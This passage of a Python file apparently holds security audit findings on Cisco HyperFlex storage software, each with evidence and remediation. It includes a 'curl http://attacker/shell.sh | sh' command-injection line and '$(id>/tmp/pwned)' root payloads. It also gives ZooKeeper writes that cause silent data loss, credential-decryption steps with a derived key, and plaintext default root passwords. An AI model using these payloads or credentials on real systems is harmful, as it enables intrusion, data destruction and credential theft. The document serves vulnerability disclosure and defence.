                "  /opt/.../redirect_client.sh 127.0.0.1; curl http://attacker/shell.sh | sh\n"
                "Shell splits on ';' — second command executes as stCtlVM root."
            ),
            "metacharacters": "semicolon, pipe, backtick, $(), newline all pass through unsanitized",
        },
        "trigger_path": (
            "SMB2 connection from attacker-controlled client → "
            "storfs-core processes connection as requiring redirection → "
            "client_needs_redirection() returns true → "
            "vfs_redirect_client(conn_str) enqueued → "
            "redirect_client executes shell command containing conn_str."
        ),
        "exploitability_note": (
            "Exploitability depends on the source of conn_str. "
            "If derived from kernel-reported client IP (not attacker-writable), "
            "injection requires a network-adjacent position spoofing the IP string. "
            "If derived from SMB SESSION_SETUP client name or NETBIOS suffix, "
            "it is directly attacker-controlled from the SMB2 handshake."
        ),
    },
    "impact": (
        "Authenticated or unauthenticated SMB2 client on storage network → "
        "metacharacters in connection identifier → "
        "arbitrary shell command execution as storfs-core process user (root on stCtlVM) → "
        "full cluster compromise."
    ),
    "remediation": (
        "Shell-escape or whitelist-validate conn_str before use in snprintf format. "
        "Replace sp_system(cmd_string) with execvp(script, [script, client_ip, NULL]) "
        "to pass client data as a discrete argument, not embedded in a shell command string. "
        "Audit all sp_system call sites for format-string injection."
    ),
}

HX_F133 = {
    "id": "HX-F133",
    "title": (
        "HyperFlex HXDP 5.x/6.x storfs-core: ZooKeeper World-Write on /cluster/* Paths Enables "
        "Cluster Topology Poisoning, Runtime Behavior Override, and Operation Injection via CRMApiGetPnodes"
    ),
    "severity": "CRITICAL",
    "cvss": "9.1",
    "cwe": "CWE-285",
    "component": (
        "storfs-core ZooKeeper client; ZooKeeper ensemble (clientPort 2181); "
        "CRM subsystem (CRMApiGetPnodes @ 0x710ef0, CRMDB_GetAllPnodes @ 0x809f40); "
        "world:anyone:cdrwa ACL inherited from HX-F100"
    ),
    "evidence": {
        "zk_path_inventory": {
            "topology_paths": [
                "/cluster/pnodes",
                "/cluster/pnodes/%s",
                "/cluster/pnodes/%s/disks/%s",
                "/cluster/members",
                "/cluster/master",
                "/cluster/vnodes/%u",
            ],
            "runtime_control_paths": [
                "/cluster/tunes/kvEnableNullIO",
                "/cluster/tunes/sysmClusterShutdownOnCritical",
                "/cluster/tunes/disableAutoRebalance",
                "/cluster/tunes/disableRebalance",
                "/cluster/tunes/crmEnableZKBatchRead",
                "/cluster/tunes/numFTVnodes",
                "/cluster/tunes/hbVersion",
                "/cluster/tunes/clusterType",
            ],
            "operation_injection_paths": [
                "/cluster/clusterops/req_%ld",
                "/cluster/clusterops/%s%010lu",
                "/cluster/dvreqs/dvr%010d",
                "/cluster/ft_dvs/%d_%s",
            ],
            "health_reporting_paths": [
                "/cluster/health",
                "/cluster/clientdata/health",
                "/cluster/clientdata/status",
                "/cluster/uptimestatus",
            ],
            "version_paths": [
                "/cluster/version",
                "/stCluster/%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
            ],
        },
        "read_path": {
            "function": "CRMApiGetPnodes",
            "address": "0x710ef0",
            "asm_evidence": (
                "0x710fd4: lea rsi, [0xc9c187]  ; '/cluster/pnodes'\n"
                "0x710fde: call CRMDBFlush\n"
                "0x711047: call CRMDB_GetAllPnodes @ 0x809f40"
            ),
            "behavior": (
                "Reads /cluster/pnodes from ZK; populates CRM pnode list used for all "
                "storage I/O routing, replication targeting, and rebalancing decisions. "
                "No authentication check on ZK read; ACL enforcement absent per HX-F100."
            ),
        },
        "attack_chains": {
            "topology_poisoning": (
                "Write crafted JSON to /cluster/pnodes/<fake-uuid> → "
                "CRMApiGetPnodes returns ghost node → "
                "storfs routes I/O to non-existent node → "
                "I/O timeouts, data unavailability."
            ),
            "null_io_activation": (
                "Write '1' to /cluster/tunes/kvEnableNullIO → "
                "storfs-core treats all I/O as successful without writing to disk → "
                "silent data loss. "
                "Write '1' to /cluster/tunes/sysmClusterShutdownOnCritical → "
                "fabricate a critical event → force cluster shutdown."
            ),
            "operation_injection": (
                "Write a node-removal operation payload to /cluster/clusterops/req_<N> → "
                "CRM processes the fake operation → "
                "legitimate storage node removed from cluster membership → "
                "cluster degraded, data under-replicated."
            ),
            "rebalance_suppression": (
                "Write '1' to /cluster/tunes/disableRebalance → "
                "prevents data rebalancing after node additions/removals → "
                "long-term data distribution skew → capacity exhaustion on subset of nodes."
            ),
        },
        "write_primitive": (
            "From HX-F100: ZK 2181 open, world:anyone:cdrwa ACL on all paths.\n"
            "kazoo write:\n"
            "  zk.ensure_path('/cluster/tunes/kvEnableNullIO')\n"
            "  zk.set('/cluster/tunes/kvEnableNullIO', b'1')"
        ),
    },
    "impact": (
        "Network-adjacent attacker with ZK access (port 2181) → "
        "write to /cluster/tunes, /cluster/pnodes, /cluster/clusterops → "
        "silent data loss (kvEnableNullIO), cluster shutdown, topology poisoning, "
        "operation injection. No auth required. Impact: entire HyperFlex cluster."
    ),
    "remediation": (
        "Apply per-path ZK ACLs: restrict /cluster/* to stCtlVM node IPs via SASL/digest auth. "
        "Block 2181 from non-cluster hosts. "
        "Validate ZK node data schema in CRM read paths — reject unexpected node types/fields. "
        "Fix root cause: apply world:anyone:r ACL (read-only) as minimum interim control; "
        "remove cdrwa from world principal."
    ),
}

HX_F134 = {
    "id": "HX-F134",
    "title": (
        "HyperFlex HXDP Cross-Version Analysis: storfs-core Binary Vulnerabilities Present from "
        "3.0.1i (2018) Through 5.5.2b (2024); Hardcoded AES Key and ZK World-Write Confirmed in 6.0.2b; "
        "6.0.2b Partial ZK Auth Mitigation Bypassable via skipZkAuthOnFailure Default"
    ),
    "severity": "INFORMATIONAL",
    "cvss": "N/A",
    "cwe": "N/A",
    "component": (
        "storfs-core (all versions), storfs-mgmt stMgr-1.0.jar (4.0.2f+), "
        "zkClusterManager-1.0.jar (6.0.2b+)"
    ),
    "evidence": {
        "version_matrix": {
            "3.0.1i-29888": {
                "date": "2018-11",
                "binary_size_mb": 11,
                "stripped": True,
                "install_path": "/opt/springpath/storfs-core/storfs",
                "HX_F131_smb_strcpy": "PRESENT (strings: smb_get_case_sensitive_file_path)",
                "HX_F132_redirect_injection": "PRESENT (strings: /opt/springpath/storfs-hyperv/redirect_client.sh)",
                "HX_F130_springpath_key": "NOT CHECKED (storfs-mgmt_*.deb absent in this build)",
                "HX_F133_zk_cluster_write": "LIKELY (cluster paths present in all versions)",
            },
            "4.0.2f-35930": {
                "date": "2021-06",
                "binary_size_mb": 13,
                "stripped": True,
                "install_path": "/opt/springpath/storfs-core/storfs",
                "HX_F131_smb_strcpy": "PRESENT (strings: smb_get_case_sensitive_file_path)",
                "HX_F132_redirect_injection": "PRESENT (strings: /opt/springpath/storfs-hyperv/redirect_client.sh)",
                "HX_F130_springpath_key": "CONFIRMED — EsxAuthZKMgmtImpl.class #496 Utf8 springpath; $anonfun$loginToNode$2 returns 'springpath'",
                "HX_F133_zk_cluster_write": "LIKELY",
            },
            "5.0.2e-42642": {
                "date": "2023-09",
                "binary_size_mb": 18,
                "stripped": False,
                "install_path": "/opt/springpath/storfs-core/storfs",
                "HX_F131_smb_strcpy": "CONFIRMED — symbols: smb_get_case_sensitive_file_path @ 0x2b0900",
                "HX_F132_redirect_injection": "CONFIRMED — symbols: vfs_redirect_client @ 0x2f8e70, redirect_client @ 0x2fd840",
                "HX_F130_springpath_key": "PRESUMED (same stMgr codebase as 4.0.2f/5.5.2b)",
                "HX_F133_zk_cluster_write": "LIKELY",
            },
            "5.5.2b-43453": {
                "date": "2024-10",
                "binary_size_mb": 18,
                "stripped": False,
                "install_path": "/opt/springpath/storfs-core/storfs",
                "HX_F131_smb_strcpy": "CONFIRMED — smb_get_case_sensitive_file_path @ 0x2bb020; strcpy at 0x2bb10d",
                "HX_F132_redirect_injection": "CONFIRMED — vfs_redirect_client @ 0x303590; redirect_client @ 0x307f70; sp_system @ 0x8c0310",
                "HX_F130_springpath_key": "CONFIRMED — EsxAuthZKMgmtImpl constant pool #N Utf8 springpath; ZK path /storvisor2/stCluster",
                "HX_F133_zk_cluster_write": "CONFIRMED — CRMApiGetPnodes @ 0x710ef0; /cluster/pnodes; kvEnableNullIO",
            },
            "6.0.2b-44423": {
                "date": "2025-11",
                "binary_size_mb": 20,
                "stripped": False,
                "install_path": "/opt/hyperflex/storfs-core/storfs",
                "HX_F131_smb_strcpy": "ABSENT — smb_get_case_sensitive_file_path not in binary; SMB code refactored out of storfs-core",
                "HX_F132_redirect_injection": "ABSENT — vfs_redirect_client, redirect_client, redirect_client.sh not in storfs-core",
                "HX_F130_springpath_key": "CONFIRMED — stMgr-1.0.jar EsxAuthZKMgmtImpl.class #495 Utf8 springpath; $anonfun$loginToNode$2",
                "HX_F133_zk_cluster_write": "CONFIRMED — /cluster/pnodes, kvEnableNullIO strings present in storfs binary",
                "zk_partial_auth_mitigation": (
                    "zkClusterManager-1.0.jar (new in 6.0.2b) — ZkConnectionManager adds optional ZK client auth:\n"
                    "  addAuthInfo(authToken=clusterUuid) if useZkAuth=true AND clusterUuid file present.\n"
                    "  DEFAULT: skipZkAuthOnFailure=true in reference.conf — auth failures silently bypassed.\n"
                    "  BYPASS: auth adds a client credential for ZK SASL/digest but does NOT change the\n"
                    "  world:anyone:cdrwa ACL on existing ZK nodes (HX-F100). Any unauthenticated client\n"
                    "  still reads/writes all paths. Partial mitigation does not close HX-F100/F133."
                ),
            },
        },
        "timeline_summary": {
            "HX_F131_F132": (
                "Introduced: <= 3.0.1i (Nov 2018, earliest version sampled). "
                "Present through: 5.5.2b (Oct 2024, ~6 year exposure window). "
                "Resolved: 6.0.2b (Nov 2025) — SMB path handling removed from storfs-core."
            ),
            "HX_F130": (
                "Introduced: <= 4.0.2f (Jun 2021, earliest version with storfs-mgmt DEB). "
                "Present through: 6.0.2b (Nov 2025, latest version confirmed). "
                "Status: NOT FIXED in 6.0.2b."
            ),
            "HX_F133_HX_F100": (
                "Introduced: <= 5.5.2b (earliest version where ZK paths confirmed confirmed). "
                "Present through: 6.0.2b (Nov 2025). "
                "6.0.2b adds optional client auth (skipZkAuthOnFailure=true by default). "
                "Status: NOT FIXED — world:anyone:cdrwa ACL on ZK nodes unchanged."
            ),
        },
        "branding_change": (
            "Install path changed from /opt/springpath/ (≤5.5.2b) to /opt/hyperflex/ (6.0.2b). "
            "Java package namespaces: com.storvisor.* (≤5.5.2b) alongside com.cisco.hxdp.* (6.0.2b new classes). "
            "stMgr/EsxAuthZKMgmtImpl retain com.storvisor.* namespace in 6.0.2b — legacy codebase unchanged."
        ),
    },
    "impact": "N/A — cross-version analysis record.",
    "remediation": (
        "HX-F131/F132: Resolved by removing SMB code from storfs-core in 6.0.2b. "
        "Customers on 5.x must upgrade to 6.0.2b+ or apply network-layer SMB/445 access controls. "
        "HX-F130: Not fixed in any sampled version — requires key rotation + secrets manager. "
        "HX-F100/F133: Not fixed in 6.0.2b — requires ZK ACL enforcement per path, not just client auth."
    ),
}

HX_F135 = {
    "id": "HX-F135",
    "title": (
        "HyperFlex HXDP 6.0.2b stSSOMgr: Hyper-V Host Credentials and AES Encryption Key "
        "Stored in ZooKeeper World-Readable Nodes — Plaintext Credential Recovery"
    ),
    "severity": "CRITICAL",
    "cvss": "9.1",
    "cwe": "CWE-312",
    "component": (
        "stSSOMgr-1.0.jar (com.storvisor.sysmgmt.stSSOMgr.StSSOMgrImpl), "
        "common-1.0.jar (EncryptionUtil, SecurityConstants)"
    ),
    "versions_affected": "4.0.2f (confirmed); 6.0.2b (confirmed); 5.x expected (identical config in all analyzed versions)",
    "description": (
        "stSSOMgr (SSO manager service) stores Hyper-V host credentials encrypted with an AES key "
        "in ZooKeeper. Both the ciphertext and the key material used to derive the AES key are "
        "written to ZK nodes with no client-side ACLs set. Any authenticated ZK client (or "
        "unauthenticated client on 5.x) can read both values and recover plaintext Hyper-V "
        "host credentials.\n\n"
        "ZK paths:\n"
        "  /stSSOMgr/creds     — AES-encrypted Hyper-V credentials (hex-encoded ciphertext)\n"
        "  /stSSOMgr/keyData   — key material for deriving the AES secret key\n\n"
        "Encryption scheme (EncryptionUtil.keyToSpec / encryptData):\n"
        "  1. keyData string -> SHA-256(keyData.getBytes('UTF-8')) -> 16 bytes -> SecretKeySpec('AES')\n"
        "  2. Cipher.getInstance('AES') — Java default = AES/ECB/PKCS5Padding\n"
        "  3. ciphertext = DatatypeConverter.printHexBinary(cipher.doFinal(plaintext))\n\n"
        "AES/ECB mode has no IV; the same plaintext always produces the same ciphertext block. "
        "An attacker who reads both ZK nodes can reconstruct the AES key and decrypt in one step.\n\n"
        "On 5.x, ZK has no client authentication (HX-F100); the nodes are accessible without "
        "credentials. On 6.x, ZK partial auth uses the known 'springpath' key (HX-F130); "
        "addAuthInfo(clusterUuid) is optional and skipZkAuthOnFailure=true. Even when auth "
        "is present, node ACLs are not set — world:anyone:cdrwa remains the effective ACL. "
        "Either path yields read access to /stSSOMgr/keyData and /stSSOMgr/creds."
    ),
    "evidence": {
        "zk_path_config": (
            "stSSOMgr-1.0/conf/application.conf:\n"
            "  stSSOMgr {\n"
            "    zkBasePath      = '/stSSOMgr'\n"
            "    zkAuthKey       = '/auth'\n"
            "    zkCredsKey      = 'creds'\n"
            "    zkEncryptionKey = 'keyData'\n"
            "  }\n"
            "=> Hyper-V creds at ZK node /stSSOMgr/creds\n"
            "=> AES key material at ZK node /stSSOMgr/keyData"
        ),
        "getEncryptionKeyFromZK_bytecode": (
            "StSSOMgrImpl.scala (StSSOMgrImpl$$anonfun$$nestedInanonfun$getEncryptionKeyFromZK$3$1):\n"
            "  On InventoryConfigMismatch/InventoryFail: retry getEncryptionKeyFromZK()\n"
            "  On other failure: log 'getEncryptionKeyInZK failed executing getZkPmInstance.write()'\n"
            "  Error msg: 'getEncryptionKeyInZK failed executing getZkPmInstance.read(). "
            "This may not be an error. Attemping to create a new enc key and set'\n"
            "  => key is auto-generated on first run and written to /stSSOMgr/keyData"
        ),
        "setHypervHostCreds_bytecode": (
            "StSSOMgrImpl.scala setHypervHostCreds(creds: String): Future[Unit]:\n"
            "  On failure: log 'setHypervHostCreds failed executing getZkPmInstance.write()'\n"
            "  Error msg: 'Failed to set hyperv host creds. write failed'\n"
            "  => encrypted creds written to ZK node /stSSOMgr/creds"
        ),
        "encryption_util_bytecode": (
            "EncryptionUtil.keyToSpec(keyString: String): SecretKeySpec:\n"
            "  sha = MessageDigest.getInstance('SHA-256').digest(keyString.getBytes('UTF-8'))\n"
            "  keyBytes = Arrays.copyOf(sha, ENCRYPTION_KEY_SIZE)  // 16 bytes (AES-128)\n"
            "  return new SecretKeySpec(keyBytes, 'AES')\n\n"
            "EncryptionUtil.encryptData(data: String): String:\n"
            "  cipher = Cipher.getInstance(SecurityConstants.ENCRYPTION_KEY_ALGORITHM())\n"
            "  // ENCRYPTION_KEY_ALGORITHM = 'AES' -> Java default = AES/ECB/PKCS5Padding\n"
            "  cipher.init(ENCRYPT_MODE, getEncryptionKey())\n"
            "  return DatatypeConverter.printHexBinary(cipher.doFinal(data.getBytes()))\n\n"
            "EncryptionUtil.decryptData(encryptedData: String): byte[]:\n"
            "  ciphertext = DatatypeConverter.parseHexBinary(encryptedData)\n"
            "  cipher = Cipher.getInstance(SecurityConstants.ENCRYPTION_KEY_ALGORITHM())\n"
            "  cipher.init(DECRYPT_MODE, keyToSpec(zkKey))\n"
            "  return cipher.doFinal(ciphertext)"
        ),
        "attack_steps": (
            "1. Connect to ZK port 2181 (no auth on 5.x; 'springpath' digest auth on 6.x)\n"
            "2. Read /stSSOMgr/keyData -> keyDataStr\n"
            "3. keyBytes = SHA-256(keyDataStr.getBytes('UTF-8'))[:16]\n"
            "4. Read /stSSOMgr/creds -> hexCiphertext\n"
            "5. ciphertext = bytes.fromhex(hexCiphertext)\n"
            "6. plaintext = AES-ECB-PKCS5Padding.decrypt(ciphertext, keyBytes)\n"
            "7. plaintext = Hyper-V host username:password"
        ),
        "security_constants": (
            "SecurityConstants$.class (common-1.0.jar):\n"
            "  #237 = Utf8  AES\n"
            "  #238 = String #237 // AES\n"
            "  ENCRYPTION_KEY_ALGORITHM field -> 'AES'\n"
            "  STORVISOR_KEYSTORE_ENTRY_AES_ENCRYPTION = 'aes_encryption'\n"
            "  Keystore file: /etc/hyperflex/secure/springpath_keystore_aes.jceks"
        ),
        "zk_acl_status": (
            "ZkConnectionManager (zkClusterManager-1.0.jar, 6.0.2b):\n"
            "  addAuthInfo(scheme='uuid', auth=clusterUuid) added if useZkAuth=true\n"
            "  skipZkAuthOnFailure=true (default) — auth failure does not abort connection\n"
            "  No ACL-setting calls on /stSSOMgr/* paths observed in any analyzed JAR\n"
            "=> world:anyone:cdrwa effective on /stSSOMgr/creds and /stSSOMgr/keyData"
        ),
    },
    "remediation": (
        "1. Set ZK ACLs on /stSSOMgr/* to auth:stSSOMgr:rw (restrict to stSSOMgr identity).\n"
        "2. Switch EncryptionUtil cipher from 'AES' (ECB) to 'AES/GCM/NoPadding' with random IV.\n"
        "3. Do not store key material in the same ZK tree as ciphertext; use a separate "
        "secrets manager (Vault, KMS) or derive the key from a host-local secret not stored in ZK."
    ),
}

HX_F136 = {
    "id": "HX-F136",
    "title": (
        "HyperFlex Witness OVA 1.1.3: firstboot.sh eval export Executes Unsanitized OVF Property "
        "Values as Root — Hypervisor Admin Shell Command Injection"
    ),
    "severity": "HIGH",
    "cvss": "7.2",
    "cwe": "CWE-78",
    "component": (
        "HyperFlex Witness OVA 1.1.3 "
        "(/usr/share/springpath/storfs-misc/firstboot.sh, /etc/init.d/firstboot)"
    ),
    "versions_affected": "Witness OVA 1.1.3 (confirmed); earlier versions expected",
    "description": (
        "firstboot.sh (run as root by /etc/init.d/firstboot at boot) uses Python to parse the "
        "VMware OVF environment from guestinfo.ovfEnv (via vmtoolsd) and outputs shell variable "
        "assignments that are fed directly to eval. Property keys are sanitized only by replacing "
        "dots with underscores; property values are sanitized only by escaping double-quote "
        "characters. Neither backticks nor $() command substitution are escaped.\n\n"
        "When eval processes output of the form key=\"$(cmd)\" or key=\"`cmd`\", the shell "
        "executes cmd as root. This occurs in three code paths:\n\n"
        "1. Main body (first boot only, line 224): eval export `getprops_from_ovfxml $OVFENV`\n"
        "2. configure_network() (every boot if guestinfo.ovfEnv changed): same eval pattern\n"
        "3. set_user_creds() (first boot, called from main): same eval pattern\n\n"
        "The attack requires control over OVF properties at deploy time (attacker constructs "
        "malicious OVA/OVF) or control over the VMware guest's guestinfo.ovfEnv at the "
        "hypervisor layer (ESXi root or vCenter admin can modify extra VM configuration, "
        "including guestinfo keys). On next reboot, configure_network compares new guestinfo "
        "content with /var/ovf.xml.old; if changed, eval executes the modified properties.\n\n"
        "The init.d/firstboot script depends on open-vm-tools being started first, and "
        "runs before SSH, nginx, or the network service, giving code execution before any "
        "network-based monitoring can observe it."
    ),
    "evidence": {
        "escape_gap": (
            "getprops_from_ovfxml() Python snippet:\n"
            "  value = property.getAttribute('oe:value')\n"
            "  value = value.replace('\"', r'\\\"')  # escapes \" only\n"
            "  print('{0}=\"{1}\"'.format(key, value))\n\n"
            "Missing escapes: backtick (`), $(), newline, semicolon, pipe in value.\n"
            "Missing escapes in key: all metacharacters except '.' (replaced with '_')."
        ),
        "eval_call_sites": (
            "Line  85: eval export `getprops_from_ovfxml $OVFENV`  # configure_network()\n"
            "Line 179: eval export `getprops_from_ovfxml $OVFENV`  # set_user_creds()\n"
            "Line 224: eval export `getprops_from_ovfxml $OVFENV`  # main body\n\n"
            "Line 224 executes only on first boot (guard: [ -f /var/.firstboot ] -> exit).\n"
            "Line 85 (configure_network) executes on every boot if guestinfo.ovfEnv changed:\n"
            "  vmtoolsd --cmd='info-get guestinfo.ovfEnv' > $OVFENV\n"
            "  if [[ -f $OVFENV_OLD && $(cmp --silent $OVFENV $OVFENV_OLD) ]]; then\n"
            "    return  # skip if unchanged\n"
            "  else\n"
            "    eval export `getprops_from_ovfxml $OVFENV`  # EXECUTES if changed\n"
            "  fi"
        ),
        "poc_payload": (
            "OVF property with value injection:\n"
            "  <Property oe:key='hx_1ip0_Cisco_HX_Witness_Appliance'\n"
            "            oe:value='$(id>/tmp/pwned)'/>\n\n"
            "Resulting eval input: hx_1ip0_Cisco_HX_Witness_Appliance=\"$(id>/tmp/pwned)\"\n"
            "eval executes: id > /tmp/pwned  (as root)\n\n"
            "Persistent post-deploy vector (hypervisor admin):\n"
            "  Modify VM extra config: guestinfo.ovfEnv = <modified XML with injection>\n"
            "  On next Witness VM reboot: configure_network() detects change, eval executes."
        ),
        "boot_order": (
            "/etc/init.d/.depend.start:\n"
            "  firstboot: open-vm-tools\n"
            "  (SSH, nginx, cron not listed as firstboot dependencies)\n"
            "=> firstboot.sh and injection execute before SSH is listening"
        ),
    },
    "remediation": (
        "Replace eval with direct variable assignment from the Python parser without shell "
        "interpretation. Parse OVF XML entirely in Python, write a safe environment file "
        "(/etc/firstboot.env), and source it with 'set -a; source /etc/firstboot.env; set +a' "
        "after validating each key against [a-zA-Z0-9_] and each value against expected format.\n"
        "Do not use backtick or $() expansion anywhere in the OVF parsing path."
    ),
}

HX_F137 = {
    "id": "HX-F137",
    "title": (
        "HyperFlex HXDP 6.0.2b storfs-core: xdr_WRITEVPLUS3args Unbounded malloc from Network-Supplied "
        "Vector Count — Unauthenticated NFS RPC Null-Deref DoS"
    ),
    "severity": "HIGH",
    "cvss": "7.5",
    "cwe": "CWE-789",
    "versions_affected": "6.0.2b (confirmed; custom WRITEVPLUS3 RPC absent in 5.5.2b — NFS surface not present)",
    "component": "storfs-core ELF x86-64, custom NFS3 extended protocol (program 3)",
    "evidence": {
        "symbol": "xdr_WRITEVPLUS3args @ 0x31d920 (storfs binary, 6.0.2b)",
        "vector_count_decode": (
            "0x31d9a7: lea 0x28(%rbx), %rsi\n"
            "0x31d9ad: call xdr_uint32          # reads 32-bit count from RPC wire stream\n"
            "           -- no upper bound check --\n"
            "0x31d9d4: mov 0x28(%rbx), %r12d    # r12d = attacker-controlled count"
        ),
        "malloc_path": (
            "0x31db1d (XDR_DECODE branch):\n"
            "  mov  %r12d, %edi               # zero-extend count to 64-bit\n"
            "  imul $0x48, %rdi, %rdi         # rdi = count * 0x48\n"
            "  call malloc                    # malloc(count * 0x48)\n"
            "  mov  %rax, 0x40(%rbx)          # store result — NO NULL check\n"
            "0x31d9f8: loop writes into 0x40(%rbx) without NULL guard"
        ),
        "crash_trigger": (
            "WRITEVPLUS3 RPC with count=0xFFFFFFFF:\n"
            "  malloc(0x47FFFFFFB8) -> NULL (OOM)\n"
            "  loop at 0x31d9f8 dereferences NULL -> SIGSEGV\n"
            "  storfs-core exits; NFS service unavailable"
        ),
        "auth_requirement": (
            "NFS3 AUTH_SYS (unix credentials) — no real authentication.\n"
            "Any host with IP-level NFS access can send arbitrary RPC calls."
        ),
        "custom_procedure": (
            "WRITEVPLUS3 is a Springpath-proprietary NFS extension (not standard NFS3).\n"
            "Dispatched via nfs3_program_3 at 0x2fcba0 for procedure 0x22.\n"
            "Not present in 5.5.2b — exclusive to 6.0.2b+ NFS code path."
        ),
    },
    "remediation": (
        "Add an upper-bound check on the vector count before the malloc call:\n"
        "  if (count > NFS_MAXIOVEC) { return FALSE; }\n"
        "where NFS_MAXIOVEC matches the cluster's negotiated max write size / 512.\n"
        "Add a NULL check after malloc: if (!ptr) { return FALSE; }\n"
        "Apply throughout all custom NFS XDR decoders that allocate from wire-supplied counts."
    ),
}

HX_F138 = {
    "id": "HX-F138",
    "title": (
        "HyperFlex HXDP 6.0.2b stNodeMgr setStretchedConfig Thrift RPC — "
        "Unsanitized AUXZK_IP Written to Sourced Shell Config → Root Command Injection"
    ),
    "severity": "CRITICAL",
    "cvss": "8.8",
    "cvss_vector": "AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-78",
    "versions_affected": "6.0.2b (confirmed); 5.5.2b not checked",
    "component": "storfs-mgmt stNodeMgr-1.0 (Scala/Finagle Thrift service, port 10207)",
    "evidence": {
        "thrift_method": (
            "StNodeMgrImpl.setStretchedConfig(String auxZkIp, boolean preferredSite)\n"
            "  — no auth check; immediately wraps in futurePool:\n"
            "  0: aload_0\n"
            "  1: invokevirtual  // futurePool\n"
            "  4: aload_0\n"
            "  5: aload_1        // auxZkIp (attacker-controlled String)\n"
            "  6: iload_2\n"
            "  7: invokedynamic  // apply$mcV$sp -> writeStretchedCfgAndRestartService\n"
            "  15: areturn"
        ),
        "injection_site": (
            "writeStretchedCfgAndRestartService (StNodeMgrImpl.class):\n"
            "  31: new    StringBuilder\n"
            "  41: ldc    \"AUXZK_IP=\"               # prefix\n"
            "  44: invokevirtual StringBuilder.append(String)  # appends AUXZK_IP=\n"
            "  47: aload_1                            # attacker-supplied auxZkIp — NO validation\n"
            "  48: invokevirtual StringBuilder.append(String)  # appends raw value\n"
            "  51: invokevirtual StringBuilder.toString\n"
            "  ...writes list as /etc/hyperflex/stretched.cfg\n"
            "  ...calls startSystemdService(\"hxArbitratorSvcMgr\")"
        ),
        "shell_source": (
            "auxzk-start.sh (storfs-stretched_6.0.2b-44423_amd64.deb):\n"
            "  line 7:  . /etc/hyperflex/stretched.cfg    # POSIX source — executes as shell\n"
            "  line 51: setup_aux_if ${AUXZK_IP}          # then uses AUXZK_IP in iptables/ip link\n"
            "  Script runs as root (mounts chroot, iptables, chroot /bin/bash)"
        ),
        "crash_trigger": (
            "setStretchedConfig('$(id>/tmp/pwned.txt)', false)  via Thrift on port 10207:\n"
            "  -> /etc/hyperflex/stretched.cfg contains:  AUXZK_IP=$(id>/tmp/pwned.txt)\n"
            "  -> hxArbitratorSvcMgr restarts\n"
            "  -> auxzk-start.sh line 7 sources the file\n"
            "  -> shell expands $(...) as command substitution -> executes as root"
        ),
        "auth_requirement": (
            "Thrift method setStretchedConfig has no token/auth check at the method level.\n"
            "stNodeMgr exposes a sessionToken() that reads /etc/hyperflex/secure/root_file.pub,\n"
            "but this token is not validated in setStretchedConfig or its lambda.\n"
            "Port 10207 is not in the firewall_allowed_ports list in application.conf,\n"
            "suggesting cluster-internal network access is sufficient (AV:A).\n"
            "If port 10207 is reachable from the management network, CVSS becomes 9.8 (AV:N)."
        ),
    },
    "remediation": (
        "1. Validate auxZkIp against a strict IPv4/IPv6 regex before any string operation.\n"
        "   Reject inputs containing shell metacharacters ($, `, ;, &, |, >, <, \\n, \\r).\n"
        "2. Do not write shell-variable-assignment syntax to files that are sourced.\n"
        "   Use a key=value properties parser in auxzk-start.sh instead of `. stretched.cfg`.\n"
        "   Replace `AUXZK_IP=$(...)` expansion with explicit validated env var export.\n"
        "3. Add Finagle request filter enforcing session token on all stNodeMgr Thrift methods\n"
        "   that modify cluster configuration (setStretchedConfig, initializeZookeeper, etc.).\n"
        "4. Restrict port 10207 to cluster storage network; block from management/ESXi network."
    ),
}

HX_F139 = {
    "id": "HX-F139",
    "title": (
        "HyperFlex HXDP 6.0.2b storfs-misc — Predictable AES Key Derived from Shipped Firmware File "
        "Decrypts Stored Credentials Including Default ctlVM Root Password"
    ),
    "severity": "CRITICAL",
    "cvss": "9.1",
    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-321",
    "versions_affected": "6.0.2b (confirmed); all versions shipping storfs-misc with Secret.class",
    "component": "storfs-misc package (springpath_env_parse.py + Secret.class + springpath_default.tunes)",
    "description": (
        "HXDP uses AES-CBC encryption to store cluster credentials in *.tunes config files. "
        "The AES key is derived as MD5(Secret.class), where Secret.class ships inside the "
        "storfs-misc firmware package. Secret.class is a Java class file containing a static "
        "long field (secreteKey = 4346757647632874372L) compiled from Test.java and deployed "
        "under the misleading name Secret.class — an attempt at obscurity that provides no "
        "actual key protection.\n\n"
        "The effective AES-256 key for all HXDP 6.0.2b installations is:\n"
        "  md5sum Secret.class = 1f6d13bcd7753f2d3b2e2da361b7afb5\n\n"
        "springpath_default.tunes (also shipped in storfs-misc) contains encrypted credentials "
        "in the [credentials] section:\n"
        "  stctl_vm_passwd  = DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU=\n"
        "  installer_passwd = DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU=\n"
        "  ssl_cert_passwd  = yWK4pTIUEr0TCjpQdp9sb/KW404x6Id/6ImlCOWdG7s=\n\n"
        "Decrypting with the derived key:\n"
        "  stctl_vm_passwd  → 'Cisco123'\n"
        "  installer_passwd → 'Cisco123'\n"
        "  ssl_cert_passwd  → 'springpath'\n\n"
        "stctl_vm_passwd is the root password for the Storage Controller VM (ctlVM), the "
        "management and data-plane core of every HyperFlex node. installer_passwd is used "
        "during HX cluster deployment. ssl_cert_passwd protects the SSL keystore.\n\n"
        "Key derivation code (springpath_env_parse.py):\n"
        "  def md5(fname):\n"
        "      hash_md5 = hashlib.md5()\n"
        "      with open(fname, 'rb') as f:\n"
        "          for chunk in iter(lambda: f.read(4096), b''):\n"
        "              hash_md5.update(chunk)\n"
        "      return hash_md5.hexdigest()\n\n"
        "  def decrypt(key, enc):\n"
        "      enc = base64.b64decode(enc)\n"
        "      iv = enc[:16]\n"
        "      cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, iv)\n"
        "      return unpad(cipher.decrypt(enc[16:]))\n\n"
        "  file_md5 = md5('/usr/share/hyperflex/storfs-misc/Secret.class')\n"
        "  decoded = decrypt(file_md5, value)  # file_md5 is the AES key\n\n"
        "Attack path: firmware download (public) → md5sum Secret.class → derive key → "
        "decrypt any HXDP tunes file containing stored credentials. "
        "Deployments using default credentials (stctl_vm_passwd unchanged at 'Cisco123') "
        "expose ctlVM root to any attacker with network access to the ctlVM SSH port (22)."
    ),
    "proof_of_concept": (
        "# Full decryption PoC\n"
